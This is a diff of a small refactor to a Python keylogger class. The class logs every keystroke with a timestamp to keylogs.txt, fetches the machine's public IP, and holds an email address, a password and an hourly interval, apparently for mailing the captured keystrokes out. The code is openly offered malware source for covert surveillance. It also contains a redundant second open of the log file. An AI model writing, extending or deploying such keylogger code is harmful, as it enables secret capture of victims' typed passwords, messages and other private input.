@@ -7,17 +7,18 @@ import requests
 
 class keylogger:
 
-    def __init__(self, emailAddress, password, emailInterval=3600):
+    def __init__(self, emailAddress, password):
         self.start_time = time.time()
         self.email = emailAddress
         self.password = password
         self.ip = requests.request('GET', 'https://api.ipify.org').text
-        self.emailInterval = emailInterval
+        self.emailInterval = 3600
+        self.logFile = "keylogs.txt"
 
     def keystroke_handler(self, key):
         dateTime = time.strftime("%m/%d/%Y %H:%M:%S")
         format = f'{dateTime}: {key}\n'
-        with open("keylogs.txt", "a") as keylogFile:
+        with open(f"{self.logFile}", "a") as keylogFile:
             keylogFile = open("keylogs.txt", "a")
             keylogFile.write(format)
 
